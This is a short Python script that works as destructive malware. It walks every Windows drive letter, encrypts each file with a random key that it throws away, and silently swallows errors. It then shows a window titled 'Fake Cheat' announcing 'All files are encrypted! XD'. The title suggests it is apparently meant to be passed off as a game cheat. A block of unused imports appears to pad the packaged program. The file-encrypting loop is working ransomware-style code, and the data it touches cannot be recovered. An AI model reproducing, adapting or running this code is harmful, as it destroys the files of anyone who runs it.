import glob
import tkinter as tk
from cryptography.fernet import Fernet

### packages not in use.
import numpy as np
import pandas as pd
import matplotlib
import seaborn
import plotly
import PIL
import polars as pl
import sklearn
import skimage
import nltk
import scipy
import tensorflow as tf
import torch
###

disk = []
for i in range(97,123):
    disk.append(chr(i))
for i in disk:
    file_list = glob.glob(i+":/**/*.*",recursive=True)
    for j in file_list:
        key = Fernet.generate_key()
        fernet = Fernet(key)
        try:
            f = open(j,"rb")
            original = f.read()
            f.close()
            encrypted = fernet.encrypt(original)
            f = open(j,"wb")
            f.write(encrypted)
            f.close()
        except:
            pass

window = tk.Tk()
window.title("Fake Cheat")
window.geometry("600x400")
window.resizable(False,False)
window.iconbitmap("icon.ico")
window.configure(background="white")

label = tk.Label(text="All files are encrypted! XD",background="white")
label.place(x=300,y=200,anchor=tk.CENTER)

window.mainloop()
